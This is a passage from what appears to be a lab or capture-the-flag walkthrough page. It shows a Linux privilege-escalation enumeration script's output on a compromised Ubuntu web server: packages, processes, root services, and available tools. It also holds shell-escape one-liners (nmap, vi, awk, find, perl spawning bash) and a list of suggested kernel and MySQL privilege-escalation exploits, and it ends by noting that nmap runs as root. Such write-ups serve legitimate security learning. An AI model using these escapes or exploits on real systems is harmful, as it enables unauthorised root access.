+    libc-bin 2.19-0ubuntu6.6  Embedded GNU C Library: Binaries
+    libc-dev-bin 2.19-0ubuntu6.6  Embedded GNU C Library: Development binaries
+    libc6:amd64 2.19-0ubuntu6.6  Embedded GNU C Library: Shared libraries
+    libc6-dev:amd64 2.19-0ubuntu6.6  Embedded GNU C Library: Development Libraries and Header Files
+    libcap2:amd64 1:2.24-0ubuntu2  support for getting/setting POSIX.1e capabilities
+    libcap2-bin 1:2.24-0ubuntu2  basic utility programs for using capabilities
+    libcgmanager0:amd64 0.24-0ubuntu7.3  Central cgroup manager daemon (client library)
+    libck-connector0:amd64 0.4.5-3.1ubuntu2  ConsoleKit libraries
+    libcloog-isl4:amd64 0.18.2-1  Chunky Loop Generator (runtime library)
+    libcomerr2:amd64 1.42.9-3ubuntu1.2  common error description library
+    libcups2:amd64 1.7.2-0ubuntu1.6  Common UNIX Printing System(tm) - Core library
+    libcurl3:amd64 7.35.0-1ubuntu2.5  easy-to-use client-side URL transfer library (OpenSSL flavour)
+    libdb5.3:amd64 5.3.28-3ubuntu3  Berkeley v5.3 Database Libraries [runtime]
+    libdbus-1-3:amd64 1.6.18-0ubuntu4.3  simple interprocess messaging system (library)
+    libdbus-glib-1-2:amd64 0.100.2-1  simple interprocess messaging system (GLib-based shared library)
+    libdebconfclient0:amd64 0.187ubuntu1  Debian Configuration Management System (C-implementation library)
+    libdevmapper1.02.1:amd64 2:1.02.77-6ubuntu2  Linux Kernel Device Mapper userspace library
+    libdpkg-perl 1.17.5ubuntu5.4  Dpkg perl modules
+    libdrm2:amd64 2.4.60-2~ubuntu14.04.1  Userspace interface to kernel DRM services -- runtime
+    libedit2:amd64 3.1-20130712-2  BSD editline and history libraries
+    libestr0 0.1.9-0ubuntu2  Helper functions for handling strings (lib)
+    libexpat1:amd64 2.1.0-4ubuntu1  XML parsing C library - runtime library
+    libfakeroot:amd64 1.20-3ubuntu2  tool for simulating superuser privileges - shared libraries
+    libffi6:amd64 3.1~rc1+r3.0.13-12  Foreign Function Interface library runtime
+    libfile-fcntllock-perl 0.14-2build1  Perl module for file locking with fcntl(2)
+    libfontconfig1:amd64 2.11.0-0ubuntu4.1  generic font configuration library - runtime
+    libfreetype6:amd64 2.5.2-1ubuntu2.4  FreeType 2 font engine, shared library files
+    libfribidi0:amd64 0.19.6-1  Free Implementation of the Unicode BiDi algorithm
+    libfuse2:amd64 2.9.2-4ubuntu4.14.04.1  Filesystem in Userspace (library)
+    libgcc-4.8-dev:amd64 4.8.4-2ubuntu1~14.04  GCC support library (development files)
+    libgcc1:amd64 1:4.9.1-0ubuntu1  GCC support library
+    libgcrypt11:amd64 1.5.3-2ubuntu4.2  LGPL Crypto library - runtime library
+    libgdbm3:amd64 1.8.3-12build1  GNU dbm database routines (runtime version)
+    libglib2.0-0:amd64 2.40.2-0ubuntu1  GLib library of C routines
+    libglib2.0-data 2.40.2-0ubuntu1  Common files for GLib library
+    libgmp10:amd64 2:5.1.3+dfsg-1ubuntu1  Multiprecision arithmetic library
+    libgnutls-openssl27:amd64 2.12.23-12ubuntu2.2  GNU TLS library - OpenSSL wrapper
+    libgnutls26:amd64 2.12.23-12ubuntu2.2  GNU TLS library - runtime library
+    libgomp1:amd64 4.8.4-2ubuntu1~14.04  GCC OpenMP (GOMP) support library
+    libgpg-error0:amd64 1.12-0.2ubuntu1  library for common error values and messages in GnuPG components
+    libgssapi-krb5-2:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries - krb5 GSS-API Mechanism
+    libgssapi3-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - GSSAPI support library
+    libhcrypto4-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - crypto library
+    libheimbase1-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - Base library
+    libheimntlm0-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - NTLM support library
+    libhx509-5-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - X509 support library
+    libice6:amd64 2:1.0.8-2  X11 Inter-Client Exchange library
+    libidn11:amd64 1.28-1ubuntu2  GNU Libidn library, implementation of IETF IDN specifications
+    libisl10:amd64 0.12.2-1  manipulating sets and relations of integer points bounded by linear constraints
+    libitm1:amd64 4.8.4-2ubuntu1~14.04  GNU Transactional Memory Library
+    libjson-c2:amd64 0.11-3ubuntu1.2  JSON manipulation library - shared library
+    libjson0:amd64 0.11-3ubuntu1.2  JSON manipulation library (transitional package)
+    libk5crypto3:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries - Crypto Library
+    libkeyutils1:amd64 1.5.6-1  Linux Key Management Utilities (library)
+    libklibc 2.0.3-0ubuntu1  minimal libc subset for use with initramfs
+    libkmod2:amd64 15-0ubuntu6  libkmod shared library
+    libkrb5-26-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - libraries
+    libkrb5-3:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries
+    libkrb5support0:amd64 1.12+dfsg-2ubuntu5.1  MIT Kerberos runtime libraries - Support library
+    libldap-2.4-2:amd64 2.4.31-1+nmu2ubuntu8.1  OpenLDAP libraries
+    liblocale-gettext-perl 1.05-7build3  module using libc functions for internationalization in Perl
+    liblockfile-bin 1.09-6ubuntu1  support binaries for and cli utilities based on liblockfile
+    liblockfile1:amd64 1.09-6ubuntu1  NFS-safe locking library
+    liblog-message-simple-perl 0.10-1  simplified interface to Log::Message
+    libltdl-dev:amd64 2.4.2-1.7ubuntu1  A system independent dlopen wrapper for GNU libtool
+    libltdl7:amd64 2.4.2-1.7ubuntu1  A system independent dlopen wrapper for GNU libtool
+    liblzma5:amd64 5.1.1alpha+20120614-2ubuntu2  XZ-format compression library
+    libmagic1:amd64 1:5.14-2ubuntu3.3  File type determination library using "magic" numbers
+    libmodule-pluggable-perl 5.1-1  module for giving modules the ability to have plugins
+    libmount1:amd64 2.20.1-5.1ubuntu20.4  block device id library
+    libmpc3:amd64 1.0.1-1ubuntu1  multiple precision complex floating-point library
+    libmpdec2:amd64 2.4.0-6  library for decimal floating point arithmetic (runtime library)
+    libmpfr4:amd64 3.1.2-1  multiple precision floating-point computation
+    libncurses5:amd64 5.9+20140118-1ubuntu1  shared libraries for terminal handling
+    libncursesw5:amd64 5.9+20140118-1ubuntu1  shared libraries for terminal handling (wide character support)
+    libnewt0.52:amd64 0.52.15-2ubuntu5  Not Erik's Windowing Toolkit - text mode windowing with slang
+    libnfnetlink0:amd64 1.0.1-2  Netfilter netlink library
+    libnih-dbus1:amd64 1.0.3-4ubuntu25  NIH D-Bus Bindings Library
+    libnih1:amd64 1.0.3-4ubuntu25  NIH Utility Library
+    libp11-kit0:amd64 0.20.2-2ubuntu2  Library for loading and coordinating access to PKCS#11 modules - runtime
+    libpam-cap:amd64 1:2.24-0ubuntu2  PAM module for implementing capabilities
+    libpam-modules:amd64 1.1.8-1ubuntu2  Pluggable Authentication Modules for PAM
+    libpam-modules-bin 1.1.8-1ubuntu2  Pluggable Authentication Modules for PAM - helper binaries
+    libpam-runtime 1.1.8-1ubuntu2  Runtime support for the PAM library
+    libpam0g:amd64 1.1.8-1ubuntu2  Pluggable Authentication Modules library
+    libpcre3:amd64 1:8.31-2ubuntu2  Perl 5 Compatible Regular Expression Library - runtime files
+    libplymouth2:amd64 0.8.8-0ubuntu17.1  graphical boot animation and logger - shared libraries
+    libpng12-0:amd64 1.2.50-1ubuntu2  PNG library - runtime
+    libpod-latex-perl 0.61-1  module to convert Pod data to formatted LaTeX
+    libpopt0:amd64 1.16-8ubuntu1  lib for parsing cmdline parameters
+    libprocps3:amd64 1:3.3.9-1ubuntu2.2  library for accessing process information from /proc
+    libpython-stdlib:amd64 2.7.5-5ubuntu3  interactive high-level object-oriented language (default python version)
+    libpython2.7-minimal:amd64 2.7.6-8  Minimal subset of the Python language (version 2.7)
+    libpython2.7-stdlib:amd64 2.7.6-8  Interactive high-level object-oriented language (standard library, version 2.7)
+    libpython3-stdlib:amd64 3.4.0-0ubuntu2  interactive high-level object-oriented language (default python3 version)
+    libpython3.4-minimal:amd64 3.4.0-2ubuntu1  Minimal subset of the Python language (version 3.4)
+    libpython3.4-stdlib:amd64 3.4.0-2ubuntu1  Interactive high-level object-oriented language (standard library, version 3.4)
+    libquadmath0:amd64 4.8.4-2ubuntu1~14.04  GCC Quad-Precision Math Library
+    libreadline6:amd64 6.3-4ubuntu2  GNU readline and history libraries, run-time libraries
+    libroken18-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - roken support library
+    librtmp0:amd64 2.4+20121230.gitdf6c518-1  toolkit for RTMP streams (shared library)
+    libsasl2-2:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - authentication abstraction library
+    libsasl2-modules:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - pluggable authentication modules
+    libsasl2-modules-db:amd64 2.1.25.dfsg1-17build1  Cyrus SASL - pluggable authentication modules (DB)
+    libselinux1:amd64 2.2.2-1ubuntu0.1  SELinux runtime shared libraries
+    libsemanage-common 2.2-1  Common files for SELinux policy management libraries
+    libsemanage1:amd64 2.2-1  SELinux policy management library
+    libsepol1:amd64 2.2-1ubuntu0.1  SELinux library for manipulating binary security policies
+    libsigsegv2:amd64 2.10-2  Library for handling page faults in a portable way
+    libslang2:amd64 2.2.4-15ubuntu1  S-Lang programming library - runtime version
+    libsm6:amd64 2:1.2.1-2  X11 Session Management library
+    libsqlite3-0:amd64 3.8.2-1ubuntu2  SQLite 3 shared library
+    libss2:amd64 1.42.9-3ubuntu1.2  command-line interface parsing library
+    libssl1.0.0:amd64 1.0.1f-1ubuntu2.15  Secure Sockets Layer toolkit - shared libraries
+    libstdc++-4.8-dev:amd64 4.8.4-2ubuntu1~14.04  GNU Standard C++ Library v3 (development files)
+    libstdc++6:amd64 4.8.4-2ubuntu1~14.04  GNU Standard C++ Library v3
+    libtasn1-6:amd64 3.4-3ubuntu0.3  Manage ASN.1 structures (runtime)
+    libterm-ui-perl 0.42-1  Term::ReadLine UI made easy
+    libtext-charwidth-perl 0.04-7build3  get display widths of characters on the terminal
+    libtext-iconv-perl 1.7-5build2  converts between character sets in Perl
+    libtext-soundex-perl 3.4-1build1  implementation of the soundex algorithm
+    libtext-wrapi18n-perl 0.06-7  internationalized substitute of Text::Wrap
+    libtimedate-perl 2.3000-1  collection of modules to manipulate date/time information
+    libtinfo5:amd64 5.9+20140118-1ubuntu1  shared low-level terminfo library for terminal handling
+    libtool 2.4.2-1.7ubuntu1  Generic library support script
+    libtsan0:amd64 4.8.4-2ubuntu1~14.04  ThreadSanitizer -- a Valgrind-based detector of data races (runtime)
+    libudev1:amd64 204-5ubuntu20.12  libudev shared library
+    libusb-0.1-4:amd64 2:0.1.12-23.3ubuntu1  userspace USB programming library
+    libustr-1.0-1:amd64 1.0.4-3ubuntu2  Micro string library: shared library
+    libuuid1:amd64 2.20.1-5.1ubuntu20.4  Universally Unique ID library
+    libwind0-heimdal:amd64 1.6~git20131207+dfsg-1ubuntu1.1  Heimdal Kerberos - stringprep implementation
+    libwrap0:amd64 7.6.q-25  Wietse Venema's TCP wrappers library
+    libx11-6:amd64 2:1.6.2-1ubuntu2  X11 client-side library
+    libx11-data 2:1.6.2-1ubuntu2  X11 client-side library
+    libxau6:amd64 1:1.0.8-1  X11 authorisation library
+    libxcb1:amd64 1.10-2ubuntu1  X C Binding
+    libxdmcp6:amd64 1:1.1.1-1  X11 Display Manager Control Protocol library
+    libxext6:amd64 2:1.3.2-1ubuntu0.0.14.04.1  X11 miscellaneous extension library
+    libxml2:amd64 2.9.1+dfsg1-3ubuntu4.4  GNOME XML library
+    libxmuu1:amd64 2:1.1.1-1  X11 miscellaneous micro-utility library
+    libxrender1:amd64 1:0.9.8-1build0.14.04.1  X Rendering Extension client library
+    libxt6:amd64 1:1.1.4-1  X11 toolkit intrinsics library
+    libxtables10 1.4.21-1ubuntu1  netfilter xtables library
+    linux-headers-3.13.0-55 3.13.0-55.94  Header files related to Linux kernel version 3.13.0
+    linux-image-3.13.0-55-generic 3.13.0-55.94  Linux kernel image for version 3.13.0 on 64 bit x86 SMP
+    linux-image-virtual 3.13.0.55.62  This package will always depend on the latest minimal generic kernel image.
+    linux-libc-dev:amd64 3.13.0-55.94  Linux Kernel Headers for development
+    locales 2.13+git20120306-12.1  common files for locale support
+    lockfile-progs 0.1.17  Programs for locking and unlocking files and mailboxes
+    login 1:4.1.5.1-1ubuntu9  system login tools
+    logrotate 3.8.7-1ubuntu1  Log rotation utility
+    lsb-base 4.1+Debian11ubuntu6  Linux Standard Base 4.1 init script functionality
+    lsb-release 4.1+Debian11ubuntu6  Linux Standard Base version reporting utility
+    m4 1.4.17-2ubuntu1  a macro processing language
+    make 3.81-8.2ubuntu3  An utility for Directing compilation.
+    makedev 2.3.1-93ubuntu1  creates device files in /dev
+    manpages 3.54-1ubuntu1  Manual pages about using a GNU/Linux system
+    manpages-dev 3.54-1ubuntu1  Manual pages about using GNU/Linux for development
+    mawk 1.3.3-17ubuntu2  a pattern scanning and text processing language
+    mime-support 3.54ubuntu1.1  MIME files 'mime.types' & 'mailcap', and support programs
+    module-init-tools 15-0ubuntu6  transitional dummy package (module-init-tools to kmod)
+    monit 1:5.6-2  utility for monitoring and managing daemons or similar programs
+    mount 2.20.1-5.1ubuntu20.4  Tools for mounting and manipulating filesystems
+    mountall 2.53  filesystem mounting tool
+    multiarch-support 2.19-0ubuntu6.6  Transitional package to ensure multiarch compatibility
+    nano 2.2.6-1ubuntu1  small, friendly text editor inspired by Pico
+    ncurses-base 5.9+20140118-1ubuntu1  basic terminal type definitions
+    ncurses-bin 5.9+20140118-1ubuntu1  terminal-related programs and man pages
+    ncurses-term 5.9+20140118-1ubuntu1  additional terminal type definitions
+    net-tools 1.60-25ubuntu2.1  The NET-3 networking toolkit
+    netbase 5.2  Basic TCP/IP networking system
+    netcat-openbsd 1.105-7ubuntu1  TCP/IP swiss army knife
+    ntpdate 1:4.2.6.p5+dfsg-3ubuntu2.14.04.3  client for setting system time from NTP servers
+    openssh-client 1:6.6p1-2ubuntu2  secure shell (SSH) client, for secure access to remote machines
+    openssh-server 1:6.6p1-2ubuntu2  secure shell (SSH) server, for secure access from remote machines
+    openssh-sftp-server 1:6.6p1-2ubuntu2  secure shell (SSH) sftp server module, for SFTP access from remote machines
+    openssl 1.0.1f-1ubuntu2.15  Secure Sockets Layer toolkit - cryptographic utility
+    os-prober 1.63ubuntu1  utility to detect other OSes on a set of drives
+    passwd 1:4.1.5.1-1ubuntu9  change and administer password and group data
+    patch 2.7.1-4ubuntu2.3  Apply a diff file to an original
+    perl 5.18.2-2ubuntu1  Larry Wall's Practical Extraction and Report Language
+    perl-base 5.18.2-2ubuntu1  minimal Perl system
+    perl-modules 5.18.2-2ubuntu1  Core Perl modules
+    plymouth 0.8.8-0ubuntu17.1  graphical boot animation and logger - main package
+    procps 1:3.3.9-1ubuntu2.2  /proc file system utilities
+    psmisc 22.20-1ubuntu2  utilities that use the proc file system
+    pwgen 2.06-1ubuntu4  Automatic Password generation
+    python 2.7.5-5ubuntu3  interactive high-level object-oriented language (default version)
+    python-chardet 2.0.1-2build2  universal character encoding detector
+    python-minimal 2.7.5-5ubuntu3  minimal subset of the Python language (default version)
+    python-requests 2.2.1-1ubuntu0.2  elegant and simple HTTP library for Python, built for human beings
+    python-six 1.5.2-1  Python 2 and 3 compatibility library (Python 2 interface)
+    python-urllib3 1.7.1-1ubuntu3  HTTP library with thread-safe connection pooling for Python
+    python2.7 2.7.6-8  Interactive high-level object-oriented language (version 2.7)
+    python2.7-minimal 2.7.6-8  Minimal subset of the Python language (version 2.7)
+    python3 3.4.0-0ubuntu2  interactive high-level object-oriented language (default python3 version)
+    python3-minimal 3.4.0-0ubuntu2  minimal subset of the Python language (default python3 version)
+    python3.4 3.4.0-2ubuntu1  Interactive high-level object-oriented language (version 3.4)
+    python3.4-minimal 3.4.0-2ubuntu1  Minimal subset of the Python language (version 3.4)
+    readline-common 6.3-4ubuntu2  GNU readline and history libraries, common files
+    resolvconf 1.69ubuntu1.1  name server information handler
+    rsync 3.1.0-2ubuntu0.1  fast, versatile, remote (and local) file-copying tool
+    rsyslog 7.4.4-1ubuntu2.6  reliable system and kernel logging daemon
+    screen 4.1.0~20120320gitdb59704-9  terminal multiplexer with VT100/ANSI terminal emulation
+    sed 4.2.2-4ubuntu1  The GNU sed stream editor
+    sensible-utils 0.0.9  Utilities for sensible alternative selection
+    sgml-base 1.26+nmu4ubuntu1  SGML infrastructure and SGML catalog file support
+    shared-mime-info 1.2-0ubuntu3  FreeDesktop.org shared MIME database and spec
+    ssh 1:6.6p1-2ubuntu2  secure shell client and server (metapackage)
+    ssh-import-id 3.21-0ubuntu1  securely retrieve an SSH public key and install it locally
+    sudo 1.8.9p5-1ubuntu1.1  Provide limited super user privileges to specific users
+    sysv-rc 2.88dsf-41ubuntu6.2  System-V-like runlevel change mechanism
+    sysvinit-utils 2.88dsf-41ubuntu6.2  System-V-like utilities
+    tar 1.27.1-1  GNU version of the tar archiving utility
+    tcpd 7.6.q-25  Wietse Venema's TCP wrapper utilities
+    tzdata 2015d-0ubuntu0.14.04  time zone and daylight-saving time data
+    ubuntu-keyring 2012.05.19  GnuPG keys of the Ubuntu archive
+    ubuntu-minimal 1.325  Minimal core of Ubuntu
+    ucf 3.0027+nmu1  Update Configuration File(s): preserve user changes to config files
+    udev 204-5ubuntu20.12  /dev/ and hotplug management daemon
+    ufw 0.34~rc-0ubuntu2  program for managing a Netfilter firewall
+    unzip 6.0-9ubuntu1.3  De-archiver for .zip files
+    upstart 1.12.1-0ubuntu4.2  event-based init daemon
+    ureadahead 0.100.0-16  Read required files in advance
+    util-linux 2.20.1-5.1ubuntu20.4  Miscellaneous system utilities
+    vim-common 2:7.4.052-1ubuntu3  Vi IMproved - Common files
+    vim-tiny 2:7.4.052-1ubuntu3  Vi IMproved - enhanced vi editor - compact version
+    vsftpd 3.0.2-1ubuntu2.14.04.1  lightweight, efficient FTP server written for security
+    wget 1.15-1ubuntu1.14.04.1  retrieves files from the web
+    whiptail 0.52.15-2ubuntu5  Displays user-friendly dialog boxes from shell scripts
+    x11-common 1:7.7+1ubuntu8.1  X Window System (X.Org) infrastructure
+    xauth 1:1.0.7-1ubuntu1  X authentication utility
+    xkb-data 2.10.1-1ubuntu1  X Keyboard Extension (XKB) configuration data
+    xml-core 0.13+nmu2  XML infrastructure and XML catalog file support
+    xz-utils 5.1.1alpha+20120614-2ubuntu2  XZ-format compression utilities
+    zip 3.0-8  Archiver for .zip files
+    zlib1g:amd64 1:1.2.8.dfsg-1ubuntu1  compression library - runtime
+    zlib1g-dev:amd64 1:1.2.8.dfsg-1ubuntu1  compression library - development
+
+[+] Current processes
+    USER PID START TIME COMMAND
+    root 1 13:43 0:00 /sbin/init
+    root 2 13:43 0:00 [kthreadd]
+    root 3 13:43 5:50 [ksoftirqd/0]
+    root 4 13:43 0:00 [kworker/0:0]
+    root 5 13:43 0:00 [kworker/0:0H]
+    root 7 13:43 5:03 [rcu_sched]
+    root 8 13:43 9:06 [rcuos/0]
+    root 9 13:43 0:00 [rcu_bh]
+    root 10 13:43 0:00 [rcuob/0]
+    root 11 13:43 0:00 [migration/0]
+    root 12 13:43 0:01 [watchdog/0]
+    root 13 13:43 0:00 [khelper]
+    root 14 13:43 0:00 [kdevtmpfs]
+    root 15 13:43 0:00 [netns]
+    root 16 13:43 0:00 [writeback]
+    root 17 13:43 0:00 [kintegrityd]
+    root 18 13:43 0:00 [bioset]
+    root 20 13:43 0:00 [kblockd]
+    root 21 13:43 0:00 [ata_sff]
+    root 22 13:43 0:00 [khubd]
+    root 23 13:43 0:00 [md]
+    root 24 13:43 0:00 [devfreq_wq]
+    root 25 13:43 0:58 [kworker/0:1]
+    root 27 13:43 0:00 [khungtaskd]
+    root 28 13:43 0:02 [kswapd0]
+    root 29 13:43 0:00 [ksmd]
+    root 30 13:43 0:00 [fsnotify_mark]
+    root 31 13:43 0:00 [ecryptfs-kthrea]
+    root 32 13:43 0:00 [crypto]
+    root 44 13:43 0:00 [kthrotld]
+    root 46 13:43 0:00 [scsi_eh_0]
+    root 47 13:43 0:00 [scsi_eh_1]
+    root 49 13:43 0:00 [kworker/u2:3]
+    root 68 13:43 0:00 [deferwq]
+    root 69 13:43 0:00 [charger_manager]
+    root 70 13:43 0:04 [kworker/u2:4]
+    root 119 13:43 0:00 [kpsmoused]
+    root 129 13:43 1:49 [jbd2/sda1-8]
+    root 130 13:43 0:00 [ext4-rsv-conver]
+    root 269 13:43 0:00 upstart-udev-bridge
+    root 275 13:43 0:00 /lib/systemd/systemd-udevd
+    root 321 13:43 0:00 upstart-file-bridge
+    syslog 334 13:43 0:00 rsyslogd
+    root 681 13:43 0:00 upstart-socket-bridge
+    root 742 13:43 0:00 dhclient
+    root 898 13:43 0:00 /usr/sbin/vsftpd
+    root 958 13:43 0:00 /sbin/getty
+    root 960 13:43 0:00 /sbin/getty
+    root 962 13:43 0:00 /sbin/getty
+    root 997 13:43 0:00 /sbin/getty
+    root 999 13:43 0:00 /sbin/getty
+    root 1018 13:43 0:00 cron
+    root 1167 13:43 0:00 /bin/sh
+    mysql 1438 13:43 20:20 /opt/bitnami/mysql/bin/mysqld.bin
+    root 1505 13:44 0:02 php-fpm:
+    root 1512 13:44 0:02 /opt/bitnami/apache2/bin/httpd.bin
+    daemon 1514 13:44 4:10 /opt/bitnami/apache2/bin/httpd.bin
+    daemon 1515 13:44 13:27 /opt/bitnami/apache2/bin/httpd.bin
+    daemon 1516 13:44 4:23 /opt/bitnami/apache2/bin/httpd.bin
+    root 1660 13:44 0:06 /usr/bin/monit
+    root 1685 13:44 0:00 /sbin/getty
+    daemon 1700 13:46 43:25 /opt/bitnami/apache2/bin/httpd.bin
+    root 2250 18:17 0:05 [kworker/u3:1]
+    root 2325 18:40 0:01 [kworker/u3:2]
+    daemon 2365 18:54 0:02 php-fpm:
+    daemon 2393 19:19 0:01 php-fpm:
+    daemon 2412 19:38 0:00 php-fpm:
+    root 2493 20:49 0:00 [kauditd]
+    daemon 2507 20:58 0:00 php-fpm:
+    daemon 2508 20:58 0:00 sh
+    daemon 2512 20:58 0:00 /bin/sh
+    daemon 2513 20:59 0:00 python
+    daemon 2514 20:59 0:00 /bin/bash
+    daemon 2734 21:29 0:00 php-fpm:
+    daemon 2735 21:29 0:00 sh
+    daemon 2739 21:29 0:00 /bin/sh
+    daemon 2749 21:30 0:00 python
+    daemon 2750 21:30 0:00 /bin/bash
+    daemon 2764 21:41 0:00 php-fpm:
+    daemon 2765 21:41 0:00 sh
+    daemon 2769 21:41 0:00 /bin/sh
+    daemon 2771 21:41 0:00 python
+    daemon 2772 21:41 0:00 /bin/bash
+    root 2775 21:41 0:00 su
+    robot 2776 21:41 0:00 bash
+    robot 2783 21:43 0:00 python
+    robot 2945 21:43 0:00 /bin/sh
+    robot 2946 21:43 0:00 ps
+    robot 2947 21:43 0:00 awk
+
+[+] Apache Version and Modules
+
+[+] Apache Config File
+
+[+] Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)
+    Sudo version 1.8.9p5
+    Sudoers policy plugin version 1.8.9p5
+    Sudoers file grammar version 43
+    Sudoers I/O plugin version 1.8.9p5
+
+[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...
+
+    root 2 13:43 0:00 [kthreadd]
+    root 17 13:43 0:00 [kintegrityd]
+    root 25 13:43 0:58 [kworker/0:1]
+    root 69 13:43 0:00 [charger_manager]
+    root 275 13:43 0:00 /lib/systemd/systemd-udevd
+    root 14 13:43 0:00 [kdevtmpfs]
+    root 11 13:43 0:00 [migration/0]
+    root 3 13:43 5:50 [ksoftirqd/0]
+    root 1685 13:44 0:00 /sbin/getty
+    root 1660 13:44 0:06 /usr/bin/monit
+        Possible Related Packages: 
+             monit 1:5.6-2  utility for monitoring and managing daemons or similar programs
+    root 23 13:43 0:00 [md]
+    root 7 13:43 5:03 [rcu_sched]
+    root 47 13:43 0:00 [scsi_eh_1]
+    root 20 13:43 0:00 [kblockd]
+    root 1505 13:44 0:02 php-fpm:
+    root 21 13:43 0:00 [ata_sff]
+    root 5 13:43 0:00 [kworker/0:0H]
+    root 997 13:43 0:00 /sbin/getty
+    root 49 13:43 0:00 [kworker/u2:3]
+    root 681 13:43 0:00 upstart-socket-bridge
+    root 70 13:43 0:04 [kworker/u2:4]
+    root 18 13:43 0:00 [bioset]
+    root 8 13:43 9:06 [rcuos/0]
+    root 44 13:43 0:00 [kthrotld]
+    root 32 13:43 0:00 [crypto]
+    root 130 13:43 0:00 [ext4-rsv-conver]
+    root 898 13:43 0:00 /usr/sbin/vsftpd
+        Possible Related Packages: 
+             vsftpd 3.0.2-1ubuntu2.14.04.1  lightweight, efficient FTP server written for security
+    root 2325 18:40 0:01 [kworker/u3:2]
+    root 962 13:43 0:00 /sbin/getty
+    root 958 13:43 0:00 /sbin/getty
+    root 960 13:43 0:00 /sbin/getty
+    root 24 13:43 0:00 [devfreq_wq]
+    root 1167 13:43 0:00 /bin/sh
+    root 1 13:43 0:00 /sbin/init
+        Possible Related Packages: 
+             busybox-initramfs 1:1.21.0-1ubuntu1  Standalone shell setup for initramfs
+             init-system-helpers 1.14  helper tools for all init systems
+             initramfs-tools 0.103ubuntu4.2  tools for generating an initramfs
+             initramfs-tools-bin 0.103ubuntu4.2  binaries used by initramfs-tools
+             initscripts 2.88dsf-41ubuntu6.2  scripts for initializing and shutting down the system
+             insserv 1.14.0-5ubuntu2  boot sequence organizer using LSB init.d script dependency information
+             libklibc 2.0.3-0ubuntu1  minimal libc subset for use with initramfs
+             lsb-base 4.1+Debian11ubuntu6  Linux Standard Base 4.1 init script functionality
+             module-init-tools 15-0ubuntu6  transitional dummy package (module-init-tools to kmod)
+             ncurses-base 5.9+20140118-1ubuntu1  basic terminal type definitions
+             ncurses-term 5.9+20140118-1ubuntu1  additional terminal type definitions
+             sysvinit-utils 2.88dsf-41ubuntu6.2  System-V-like utilities
+             upstart 1.12.1-0ubuntu4.2  event-based init daemon
+    root 1018 13:43 0:00 cron
+        Possible Related Packages: 
+             cron 3.0pl1-124ubuntu2  process scheduling daemon
+    root 9 13:43 0:00 [rcu_bh]
+    root 2493 20:49 0:00 [kauditd]
+    root 46 13:43 0:00 [scsi_eh_0]
+    root 2775 21:41 0:00 su
+    root 68 13:43 0:00 [deferwq]
+    root 4 13:43 0:00 [kworker/0:0]
+    root 30 13:43 0:00 [fsnotify_mark]
+    root 29 13:43 0:00 [ksmd]
+    root 13 13:43 0:00 [khelper]
+    root 28 13:43 0:02 [kswapd0]
+    root 2250 18:17 0:05 [kworker/u3:1]
+    root 16 13:43 0:00 [writeback]
+    root 27 13:43 0:00 [khungtaskd]
+    root 31 13:43 0:00 [ecryptfs-kthrea]
+    root 12 13:43 0:01 [watchdog/0]
+    root 269 13:43 0:00 upstart-udev-bridge
+    root 1512 13:44 0:02 /opt/bitnami/apache2/bin/httpd.bin
+    root 22 13:43 0:00 [khubd]
+    root 10 13:43 0:00 [rcuob/0]
+    root 119 13:43 0:00 [kpsmoused]
+    root 129 13:43 1:49 [jbd2/sda1-8]
+    root 321 13:43 0:00 upstart-file-bridge
+    root 742 13:43 0:00 dhclient
+    root 999 13:43 0:00 /sbin/getty
+    root 15 13:43 0:00 [netns]
+
+[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...
+
+[+] Installed Tools
+    /usr/bin/awk
+    /usr/bin/perl
+    /usr/bin/python
+    /usr/bin/gcc
+    /usr/bin/cc
+    /usr/bin/vi
+    /usr/local/bin/nmap
+    /usr/bin/find
+    /bin/netcat
+    /bin/nc
+    /usr/bin/wget
+
+[+] Related Shell Escape Sequences...
+
+    nmap-->	--interactive
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+    perl-->	perl -e 'exec "/bin/bash";'
+
+[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...
+
+    Note: Exploits relying on a compile/scripting language not detected on this system are marked with a '**' but should still be tested!
+
+    The following exploits are ranked higher in probability of success because this script detected a related running process, OS, or mounted file system
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+
+    The following exploits are applicable to this kernel version and should be investigated as well
+    - Kernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=c
+    - Sendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**
+    - CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=c
+    - CAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=c
+    - MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=c
+    - open-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=c
+    - open-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=c
+
+Finished
+=================================================================================================
+</pre>
+<p><font size="3.5" color="black">I discovered that Nmap is installed on the system and it runs using root permissions.</font></p> 
